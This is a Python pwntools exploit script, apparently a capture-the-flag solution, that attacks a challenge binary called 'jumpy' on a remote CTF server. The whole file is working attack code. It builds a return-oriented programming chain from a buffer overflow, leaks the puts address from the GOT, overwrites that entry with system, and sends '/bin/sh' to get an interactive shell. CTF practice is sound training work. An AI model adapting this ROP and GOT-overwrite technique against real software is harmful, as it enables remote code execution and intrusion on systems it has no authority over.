from pwn import *

#r = process("./jumpy")
#gdb.attach(r)
r = remote("server.challenge.ctf.thefewchosen.com", 1337)
# nc server.challenge.ctf.thefewchosen.com 1337


puts = 0x401030
setvbuf = 0x401040
puts_got = 0x0000000000404018
setvbuf_got = 0x0000000000404020
pop_rdi_ret = 0x000000000040121b
pop_rsi_r15_ret = 0x0000000000401219
ret = 0x0000000000401016
formats = 0x403037
scanf = 0x401050
bss = 0x00404500

r.recvuntil(b'today?')

payload = b"a"*7*8 + p64(ret)
payload += p64(pop_rdi_ret) + p64(puts_got)
payload += p64(puts)
payload += p64(pop_rdi_ret) + p64(formats)
payload += p64(pop_rsi_r15_ret) + p64(puts_got) + p64(0)
payload += p64(scanf)

payload += p64(pop_rdi_ret) + p64(formats)
payload += p64(pop_rsi_r15_ret) + p64(bss) + p64(0)
payload += p64(scanf) 


payload += p64(ret)
payload += p64(pop_rdi_ret) + p64(bss)
payload += p64(puts)




r.sendline(payload)
stuff = r.recvuntil(b'\x7f')[-6:]
stuff = int.from_bytes(stuff, "little")
libc_base = stuff - 0x0000000000875a0

system = libc_base + 0x0000000000055410

print(hex(stuff))

r.sendline(p64(system))
#pause(1)
r.sendline(b'/bin/sh\x00')


r.interactive()